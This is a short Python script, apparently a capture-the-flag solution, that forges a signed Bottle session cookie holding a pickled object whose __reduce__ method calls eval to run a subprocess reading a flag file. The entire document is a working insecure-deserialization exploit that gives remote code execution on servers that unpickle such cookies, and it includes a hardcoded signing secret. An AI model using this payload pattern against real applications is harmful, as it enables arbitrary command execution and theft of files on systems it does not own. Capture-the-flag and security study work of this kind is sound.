from bottle import default_app, get, run, request, response, template
secret = "cCySMEDJ9LOlStFzu-k9HE0XUZIkGlGqMkDOBHOldXI"
class Foo(object):
    def __init__(self):
        pass
    def __reduce__(self):
        return eval, ("__import__('subprocess').run(['cat', '/h3y_i_4m_th3_fl4ggg'], capture_output=True).stdout", )

bar = Foo()
print(bar)
session = {"payloads": [bar]}
response.set_cookie('session', session, secret=secret)
print(response)